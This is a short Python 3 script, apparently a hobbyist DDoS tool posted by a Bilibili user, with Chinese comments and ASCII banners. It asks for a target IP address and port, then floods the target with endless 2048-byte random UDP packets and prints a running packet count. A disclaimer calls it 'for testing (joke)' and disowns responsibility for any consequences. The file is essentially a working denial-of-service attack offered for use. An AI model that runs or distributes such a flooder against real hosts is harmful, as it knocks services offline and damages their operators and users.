#!/usr/bin/python3
import os
import sys
import time
import socket
import random

os.system('toilet -f mono12 DDoS')
os.system('toilet -f mono12 Attack')
os.system('toilet -f mono12 Guy')
print('''Made by 爆坑数据 on bilibili
借鉴了https://github.com/Ha3MrX中的DDoS攻击器
只适用于测试(滑稽)用途(　´・◡・｀),可以继续借鉴
对原Python2的代码进行了一定的改造ヘ(￣ω￣ヘ)♪
Ctrl-C键可以紧急取消
请安装toilet软件包以获得最佳装X效果
Python水平较差大佬轻喷''')
os.system('toilet -f mono12 Ver.0.1')
print('无法显示字符的请自觉安装toilet软件包')
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
print('目标锁定!!!')
os.system('arp -e')
print('''准备攻击
请输入希望攻击的IP地址或域名''')
ip = input('IP ( • ̀ω ⁃᷄)✧ ：')
port = input('端口 :')
bytes = random._urandom(2048)
os.system('clear')
os.system('toilet -F metal -f mono12 WARNING')
print('最后一次警告，准备开始攻击\n这个作品是测试版，攻击所造成的一切后果作者不负任何责任！！！')
wait = input('继续攻击吗?')
print('准备中')
time.sleep(2)
os.system('toilet -F gay -f mono12 START!!!')
send = 0
ip = str(ip)
port = int(port)
while True:
	sock.sendto(bytes, (ip,port))
	send = send + 1
	print('已发送 %s 个包'% send)
